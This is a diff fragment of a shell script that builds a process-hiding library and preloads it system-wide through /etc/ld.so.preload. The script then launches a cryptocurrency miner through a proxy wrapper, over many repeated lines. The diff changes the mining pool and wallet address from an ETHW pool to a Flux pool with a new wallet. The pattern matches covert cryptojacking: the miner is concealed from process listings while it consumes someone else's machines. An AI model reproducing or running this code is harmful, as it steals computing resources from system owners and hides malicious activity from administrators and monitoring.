@@ -42,18 +42,18 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX 
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX 
 
-./graftcp/graftcp ./bezzHash --url=annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethw.ss.poolin.one:443 --ocX
+./graftcp/graftcp ./bezzHash --url=t1QcGVkoHGuvYGGZY4Zjid8CVHzc9JED876.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.flux.herominers.com:1200 --ocX
